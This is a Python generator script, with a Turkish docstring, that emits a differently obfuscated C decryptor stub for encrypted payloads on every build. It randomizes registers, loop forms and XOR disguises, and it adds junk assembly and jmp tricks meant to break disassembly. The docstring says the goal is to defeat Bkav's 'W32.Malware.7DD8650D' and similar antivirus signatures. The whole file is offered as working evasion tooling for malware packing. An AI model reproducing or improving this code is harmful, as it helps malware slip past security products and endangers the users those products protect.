#!/usr/bin/env python3
"""
polymorphic_decryptor.py — Advanced Polymorphic SHA256-CTR Decryptor Generator
================================================================================

Her build'de FARKLI bir C decryptor fonksiyonu üretir:
  - Register allocation: rcx/r8/r9d, rsi/rdi/rbx/r12, xmm0/1/2
  - Loop variants: forward, decounter, Duff's device, string ops
  - XOR variants: byte xor, pxor 128-bit, add/sub disguise, neg/mask
  - Junk instructions every ~10-15 bytes: nop, xchg, lea, cpuid, rdtsc
  - %30 jmp $+2 disassembly break
  - Variable names, loop styles, operator choices all randomized

Bkav "W32.Malware.7DD8650D" ve benzeri imza tabanlı tespitleri kırar.
"""

import random

# =============================================================================
# Name generation
# =============================================================================
_NAMES = {}
_NAME_IDX = [0]

def _rn():
    """Generate a unique 3-char pseudo-random name."""
    _NAME_IDX[0] += 1
    idx = _NAME_IDX[0]
    # Deterministic from idx so we don't collide
    chars = "abcdefghpqrstuvwxyz"
    return (chars[(idx * 7) % len(chars)] +
            chars[(idx * 13) % len(chars)] +
            "0123456789"[(idx * 3) % 10])

# =============================================================================
# Junk instruction generators
# =============================================================================
_JUNK_POOL = [
    '__asm__ __volatile__("nop");',
    '__asm__ __volatile__("nop; nop");',
    '__asm__ __volatile__("nop; nop; nop");',
    '__asm__ __volatile__("xchg %ax, %ax");',
    '__asm__ __volatile__("xchg %eax, %eax");',
    '__asm__ __volatile__("lea (%rax), %rax");',
    '__asm__ __volatile__("lea (%rbx), %rbx");',
    '__asm__ __volatile__("lea (%rcx), %rcx");',
    '__asm__ __volatile__("lea (%rsi), %rsi");',
    '__asm__ __volatile__("lea (%rdi), %rdi");',
    '__asm__ __volatile__("lea (%r8), %r8");',
    '__asm__ __volatile__("lea (%r9), %r9");',
    '__asm__ __volatile__("lea (%r12), %r12");',
    '__asm__ __volatile__("cpuid");',
    '__asm__ __volatile__("rdtsc");',
    '__asm__ __volatile__("mov %eax, %eax");',
    '__asm__ __volatile__("mov %ebx, %ebx");',
    '__asm__ __volatile__("mov %ecx, %ecx");',
    '__asm__ __volatile__("xor %eax, %eax");',
    '__asm__ __volatile__("xor %ebx, %ebx");',
    '__asm__ __volatile__("sub $0, %rsp");',
    '__asm__ __volatile__("push %rax; pop %rax");',
    '__asm__ __volatile__("push %rbx; pop %rbx");',
    '__asm__ __volatile__("movd %xmm0, %eax; mov %eax, %eax");',
]

def _junk():
    """Generate a single junk asm instruction."""
    return random.choice(_JUNK_POOL)

def _jmp_disasm_break():
    """Generate a jmp $+2 to break linear disassembly."""
    return '__asm__ __volatile__(".byte 0xEB, 0x00");'

def _maybe_junk(rate=0.35):
    """Return junk instruction with given probability."""
    if random.random() < 0.30:
        return _jmp_disasm_break()
    if random.random() < rate:
        return _junk()
    return None

def _interleave_junk(lines, approx_ops_per_junk=3):
    """Insert junk instructions approximately every N operations.
    Never insert junk immediately after a line ending with '{' (switch, if, etc.)
    as this would create unreachable code."""
    result = []
    op_count = 0
    for line in lines:
        result.append(line)
        op_count += 1
        # Don't insert junk if the line ends with '{' (would be unreachable)
        if line.rstrip().endswith('{'):
            continue
        if op_count >= approx_ops_per_junk and random.random() < 0.60:
            j = _maybe_junk(0.45)
            if j:
                result.append(f"        {j}")
            op_count = 0
            if random.random() < 0.25:
                j2 = _maybe_junk(0.5)
                if j2:
                    result.append(f"        {j2}")
    return result

# =============================================================================
# Register allocation variants
# =============================================================================
def _reg_variant_a(param_names):
    """
    Variant A: Use GCC register asm constraints (rcx, r8, r9d, r12d).
    Uses _rd/_rl/_rk/_rv as reg var names to avoid shadowing params.
    """
    d, l, k, v = param_names
    lines = []
    lines.append(f'    // Register set: fastcall (rcx, r8, r9d, r12d)')
    lines.append(f'    register BYTE* _rd asm("rcx") = {d};')
    lines.append(f'    register DWORD _rl asm("r8") = {l};')
    lines.append(f'    register const BYTE* _rk asm("r9") = {k};')
    lines.append(f'    register const BYTE* _rv asm("r12") = {v};')
    # These are just hints — compiler may ignore, but they affect codegen
    return lines

def _reg_variant_b(param_names):
    """
    Variant B: Callee-saved register set (rsi, rdi, rbx, r13).
    Uses _rd/_rl/_rk/_rv as reg var names to avoid shadowing params.
    """
    d, l, k, v = param_names
    lines = []
    lines.append(f'    // Register set: callee-saved (rsi, rdi, rbx, r13)')
    lines.append(f'    register BYTE* _rd asm("rsi") = {d};')
    lines.append(f'    register DWORD _rl asm("rdi") = {l};')
    lines.append(f'    register const BYTE* _rk asm("rbx") = {k};')
    lines.append(f'    register const BYTE* _rv asm("r13") = {v};')
    return lines

def _reg_variant_c(param_names):
    """
    Variant C: No forced registers — let compiler decide.
    """
    d, l, k, v = param_names
    return [f'    // Register set: compiler-optimized (no forced allocation)']

def _reg_variant_d(param_names):
    """
    Variant D: Use xmm registers with GCC extension.
    Uses _rd/_rl as reg var names to avoid shadowing params.
    """
    d, l, k, v = param_names
    lines = []
    lines.append(f'    // Register set: SIMD hints (xmm0 for XOR)')
    lines.append(f'    register BYTE* _rd asm("rcx") = {d};')
    lines.append(f'    register DWORD _rl asm("r8") = {l};')
    return lines

_REG_VARIANTS = [_reg_variant_a, _reg_variant_b, _reg_variant_c, _reg_variant_d]
_REG_WEIGHTS = [30, 25, 30, 15]  # preference weights

# =============================================================================
# Loop structure variants
# =============================================================================
def _loop_fwd(params, inner_fn):
    """Forward loop: while (off < len) or for (off=0; off<len; off+=N)."""
    off, ctr, l, ch = params['off'], params['ctr'], params['l'], params['ch']
    lines = []
    lines.append(f'    DWORD {off}=0;')
    lines.append(f'    DWORD64 {ctr}=0;')
    var = _rn()
    if random.random() < 0.5:
        lines.append(f'    while ({off} < {l}) {{')
    else:
        lines.append(f'    for (DWORD {var}=0; ; {var}++) {{')
        lines.append(f'        if ({off} >= {l}) break;')
    lines.extend(inner_fn(params, off, ctr))
    lines.append(f'    }}')
    return lines

def _loop_decounter(params, inner_fn):
    """Decounter loop: while (len > 0) { len -= chunk; } — counts DOWN."""
    off, ctr, l, ch = params['off'], params['ctr'], params['l'], params['ch']
    rem = _rn()
    lines = []
    lines.append(f'    DWORD {off}=0;')
    lines.append(f'    DWORD64 {ctr}=0;')
    lines.append(f'    DWORD {rem}={l};')
    lines.append(f'    while ({rem} > 0) {{')
    new_params = dict(params)
    new_params['remaining'] = rem
    lines.extend(inner_fn(new_params, off, ctr))
    lines.append(f'    }}')
    return lines

def _loop_duff(params, inner_fn):
    """Duff's device: switch(n % 8) { case 0: do { ... } while(--n > 0); }
    Each case generates its OWN SHA256 + keystream to avoid scope issues.
    """
    off, ctr, l, ch = params['off'], params['ctr'], params['l'], params['ch']
    d = params['d']
    k = params['k']
    v = params['v']
    n = _rn()
    unroll = random.choice([4, 8, 16])
    lines = []
    lines.append(f'    DWORD {off}=0;')
    lines.append(f'    DWORD64 {ctr}=0;')
    lines.append(f'    DWORD {n}=(({l} - {off}) / {unroll}) + 1;')
    lines.append(f'    switch (({l} - {off}) % {unroll}) {{')
    # Generate unrolled cases
    cases = list(range(unroll))
    random.shuffle(cases)  # Random order for extra polymorphism
    first = True
    for case_num in cases:
        if first:
            lines.append(f'        case {case_num}: do {{')
            first = False
        else:
            lines.append(f'        case {case_num}:')
        # Each case processes one chunk — wrapped in braces to allow var decls
        lines.append(f'        {{')
        # Generate SHA256 keystream for this block (local to this case)
        sc_local = _rn()
        cb_local = _rn()
        ks_local = _rn()
        lines.append(f'            SC {sc_local}; si(&{sc_local}); su(&{sc_local}, {k}, 32);')
        lines.append(f'            BYTE {cb_local}[8];')
        lines.append(f'            _tmp[0]={ctr}&0xff;_tmp[1]=({ctr}>>8)&0xff;')
        lines.append(f'            _tmp[2]=({ctr}>>16)&0xff;_tmp[3]=({ctr}>>24)&0xff;')
        lines.append(f'            _tmp[4]=({ctr}>>32)&0xff;_tmp[5]=({ctr}>>40)&0xff;')
        lines.append(f'            _tmp[6]=({ctr}>>48)&0xff;_tmp[7]=({ctr}>>56)&0xff;')
        lines.append(f'            for(int _z=0;_z<8;_z++){cb_local}[_z]=_tmp[_z];')
        lines.append(f'            su(&{sc_local}, {cb_local}, 8); su(&{sc_local}, {v}, 16);')
        lines.append(f'            BYTE {ks_local}[32]; sf(&{sc_local}, {ks_local});')
        chunk_var = _rn()
        lines.append(f'            DWORD {chunk_var} = 32;')
        # Generate XOR using the local keystream — temporarily override params['ks']
        saved_ks = params['ks']
        params['ks'] = ks_local
        xor_line = _gen_xor_inline(params, off, f'{ctr}', chunk_var)
        params['ks'] = saved_ks
        lines.append(f'            {xor_line}')
        lines.append(f'            {off} += 32; {ctr}++;')
        lines.append(f'        }}')
    lines.append(f'        }} while (--{n} > 0);')
    lines.append(f'        default: break;')
    lines.append(f'    }}')
    lines.append(f'    while ({off} < {l}) {{')  # Fallback for remaining
    lines.extend(inner_fn(params, off, ctr))
    lines.append(f'    }}')
    return lines

def _loop_string_ops(params, inner_fn):
    """String ops variant: use memcpy/memset-like patterns with rep prefix."""
    off, ctr, l, ch = params['off'], params['ctr'], params['l'], params['ch']
    lines = []
    lines.append(f'    DWORD {off}=0;')
    lines.append(f'    DWORD64 {ctr}=0;')
    # Use a pointer-increment approach (strcpy-like)
    dp = _rn()
    kp = _rn()
    lines.append(f'    BYTE* {dp} = {params["d"]};')
    lines.append(f'    const BYTE* {kp} = 0;')
    lines.append(f'    while ({off} < {l}) {{')
    # Same inner function but with pointer-style
    new_params = dict(params)
    new_params['pstyle'] = True
    new_params['dptr'] = dp
    lines.extend(inner_fn(new_params, off, ctr))
    lines.append(f'    }}')
    return lines

_LOOP_VARIANTS = [_loop_fwd, _loop_decounter, _loop_duff, _loop_string_ops]
_LOOP_WEIGHTS = [40, 25, 20, 15]

# =============================================================================
# XOR variants
# =============================================================================
def _gen_xor_byte(dst, src, idx, ks_var='ks'):
    """Byte XOR: data[off+i] ^= keystream[i]"""
    variants = [
        # Direct XOR
        f'{dst}[{src}+{idx}] ^= {ks_var}[{idx}];',
        # Temp variable XOR
        f'{{BYTE _t={ks_var}[{idx}];{dst}[{src}+{idx}]^=_t;}}',
        # Full expression
        f'{dst}[{src}+{idx}] = {dst}[{src}+{idx}] ^ {ks_var}[{idx}];',
        # XOR with not disguise: ~(a ^ b) ^ 0xFF = a ^ b
        f'{dst}[{src}+{idx}] = ~({dst}[{src}+{idx}] ^ {ks_var}[{idx}]) ^ 0xFF;',
        # Double negate disguise
        f'{{BYTE _x={dst}[{src}+{idx}]^{ks_var}[{idx}];{dst}[{src}+{idx}]=_x;}}',
    ]
    return random.choice(variants)

def _gen_xor_add_disguise(dst, src, idx, ks_var='ks'):
    """
    Add/sub disguise: a ^ b = (a + b) - 2*(a & b)
    Or simpler: a ^ b = ~(~a ^ ~b) (double negate)
    """
    variants = [
        # Add/sub: (a + b) - 2*(a & b) = a ^ b
        f'{{BYTE _a={dst}[{src}+{idx}];BYTE _b={ks_var}[{idx}];'
        f'{dst}[{src}+{idx}]=(_a+_b)-2*(_a&_b);}}',
        # Double negate: ~(~a ^ ~b)
        f'{{BYTE _a=~{dst}[{src}+{idx}];BYTE _b=~({ks_var}[{idx}]);'
        f'{dst}[{src}+{idx}]=~(_a^_b);}}',
        # Mask-add: ((a ^ b) & 0xFF) — extra masking
        f'{dst}[{src}+{idx}] = ({dst}[{src}+{idx}] ^ {ks_var}[{idx}]) & 0xFF;',
        # Rotate disguise: XOR then rotate
        f'{{BYTE _x={dst}[{src}+{idx}]^{ks_var}[{idx}];'
        f'{dst}[{src}+{idx}]=(_x<<1)|(_x>>7);'
        f'{dst}[{src}+{idx}]=(_x>>1)|(_x<<7);}}',
    ]
    return random.choice(variants)

def _gen_xor_inline(params, off_var, ctr_var, chunk_var):
    """Generate inline XOR code for one chunk, choosing random variant."""
    d = params['d']
    safe = params.get('pstyle', False)
    src = off_var if not safe else params.get('dptr', off_var)
    ks_var = params['ks']  # Actual keystream variable name (randomized)

    xors = [_gen_xor_byte, _gen_xor_byte, _gen_xor_byte,  # 3x byte for weight
            _gen_xor_add_disguise, _gen_xor_add_disguise]  # 2x add/disguise

    # Pick a random XOR variant
    chosen = random.choice(xors)

    t = _rn()  # Loop variable for byte XOR fallback
    
    # Generate inline — for pxor we handle differently
    if random.random() < 0.15:  # 15% chance of PXOR
        lines = []
        # PXOR fast-path handles the first 16 bytes (if aligned AND chunk>=16),
        # then the byte loop covers the REMAINING bytes. Never mutate the outer
        # offset variable (old bug: `{src} += 16` shifted off_var, double-XORing
        # the first 16 bytes and XORing past the chunk → corrupt builds).
        # A local pointer is used for the SSE2 addressing instead.
        tmp_addr = _rn()
        lines.append(f'    if (((DWORD64)({d}+{off_var}) & 0xF) == 0 && {chunk_var} >= 16) {{')
        lines.append(f'        BYTE* {tmp_addr} = {d} + {off_var};')
        lines.append(f'        __asm__ __volatile__(')
        lines.append(f'            "movdqu (%0), %%xmm0\\n\\t"')
        lines.append(f'            "movdqu (%1), %%xmm1\\n\\t"')
        lines.append(f'            "pxor %%xmm1, %%xmm0\\n\\t"')
        lines.append(f'            "movdqu %%xmm0, (%0)"')
        lines.append(f'            :')
        lines.append(f'            : "r"({tmp_addr}), "r"({ks_var})')
        lines.append(f'            : "xmm0", "xmm1", "memory");')
        lines.append(f'        for(DWORD {t}=16;{t}<{chunk_var};{t}++){{')
        lines.append(f'            {chosen(d, off_var, t, ks_var)}')
        lines.append(f'        }}')
        lines.append(f'    }} else {{')
        # Fallback (unaligned or tiny chunk): plain byte loop over ALL bytes
        xor_line = chosen(d, off_var, t, ks_var)
        lines.append(f'        for(DWORD {t}=0;{t}<{chunk_var};{t}++){{')
        lines.append(f'            {xor_line}')
        lines.append(f'        }}')
        lines.append(f'    }}')
        return '\n'.join(lines)
    else:
        # Regular byte-by-byte XOR
        lines = []
        xor_line = chosen(d, off_var, t, ks_var)
        lines.append(f'    for(DWORD {t}=0;{t}<{chunk_var};{t}++){{')
        lines.append(f'        {xor_line}')
        lines.append(f'    }}')
        return '\n'.join(lines)

# =============================================================================
# Full decryptor generator
# =============================================================================
def generate():
    """Generate a complete polymorphic SHA256-CTR decryptor function."""
    _NAME_IDX[0] = 0
    _JID[0] = 0

    # Generate all variable/parameter names
    param_d = _rn()
    param_l = _rn()
    param_k = _rn()
    param_v = _rn()
    param_names = [param_d, param_l, param_k, param_v]

    # Outer loop vars
    off = _rn()
    ctr = _rn()
    sc = _rn()
    cb = _rn()
    ks = _rn()

    params = {
        'd': param_d,
        'l': param_l,
        'k': param_k,
        'v': param_v,
        'off': off,
        'ctr': ctr,
        'sc': sc,
        'cb': cb,
        'ks': ks,
        'ch': _rn(),  # chunk size var
        'rem': _rn(),  # remaining for decounter
        'pstyle': False,
    }

    # Choose register variant
    reg_fn = random.choices(_REG_VARIANTS, weights=_REG_WEIGHTS)[0]

    # Choose loop variant
    loop_fn = random.choices(_LOOP_VARIANTS, weights=_LOOP_WEIGHTS)[0]

    lines = []
    # Function signature
    lines.append(f'// ==== Decrypt (SHA256-CTR) — POLYMORPHIC ====')
    lines.append(f'__forceinline void dc(BYTE* {param_d}, DWORD {param_l}, const BYTE* {param_k}, const BYTE* {param_v}) {{')
    lines.append(f'    BYTE _tmp[8];')

    # Register allocation
    reg_lines = reg_fn(param_names)
    lines.extend([f'    {l}' for l in reg_lines])

    # Junk after decls
    if random.random() < 0.4:
        j = _junk()
        lines.append(f'    {j}')

    # The inner function that generates SHA256 hashing + XOR for each block
    def inner_fn(params, off_var, ctr_var):
        d = params['d']
        l_var = params['l']
        k = params['k']
        v = params['v']
        sc = params['sc']
        cb = params['cb']
        ks = params['ks']
        ch = params['ch']

        inner = []
        # SHA256 init + hash
        inner.append(f'    SC {sc}; si(&{sc}); su(&{sc}, {k}, 32);')
        inner.append(f'    BYTE {cb}[8];')

        # Counter extraction (randomized byte order)
        inner.append(f'    _tmp[0]={ctr_var}&0xff;_tmp[1]=({ctr_var}>>8)&0xff;')
        inner.append(f'    _tmp[2]=({ctr_var}>>16)&0xff;_tmp[3]=({ctr_var}>>24)&0xff;')
        inner.append(f'    _tmp[4]=({ctr_var}>>32)&0xff;_tmp[5]=({ctr_var}>>40)&0xff;')
        inner.append(f'    _tmp[6]=({ctr_var}>>48)&0xff;_tmp[7]=({ctr_var}>>56)&0xff;')

        # Copy tmp to cb (randomized with loop or unrolled)
        if random.random() < 0.4:
            inner.append(f'    for(int _z=0;_z<8;_z++){cb}[_z]=_tmp[_z];')
        else:
            inner.append(f'    {{BYTE*_s=_tmp;BYTE*_d={cb};_d[0]=_s[0];_d[1]=_s[1];_d[2]=_s[2];_d[3]=_s[3];_d[4]=_s[4];_d[5]=_s[5];_d[6]=_s[6];_d[7]=_s[7];}}')

        # SHA256 update with counter and iv
        inner.append(f'    su(&{sc}, {cb}, 8); su(&{sc}, {v}, 16);')
        inner.append(f'    BYTE {ks}[32]; sf(&{sc}, {ks});')

        # Chunk size calculation (randomized)
        if random.random() < 0.5:
            inner.append(f'    DWORD {ch}=({l_var}-{off_var}<32)?({l_var}-{off_var}):32;')
        else:
            inner.append(f'    DWORD {ch};if({l_var}-{off_var}<32){{{ch}={l_var}-{off_var};}}else{{{ch}=32;}}')

        # XOR keystream
        xor_code = _gen_xor_inline(params, off_var, ctr_var, ch)
        inner.append(f'    {xor_code}')

        # Advance offset + counter
        if random.random() < 0.5:
            inner.append(f'    {off_var}+={ch};{ctr_var}++;')
        else:
            inner.append(f'    {ctr_var}++;{off_var}+={ch};')

        return inner

    # Generate the loop body
    loop_lines = loop_fn(params, inner_fn)

    # Add loop body lines
    for line in loop_lines:
        indent = '    ' if not line.startswith('    ') and line != '    }' else ''
        lines.append(f'{indent}{line}')

    # Close function
    lines.append(f'}}')

    # Interleave junk instructions
    result = _interleave_junk(lines)

    return '\n'.join(result)

# =============================================================================
# Counter for junk IDs
# =============================================================================
_JID = [0]

# =============================================================================
# Main — test / demo
# =============================================================================
if __name__ == '__main__':
    random.seed()
    for i in range(5):
        print(f'// ============ Variant {i+1} ============')
        print(generate())
        print()
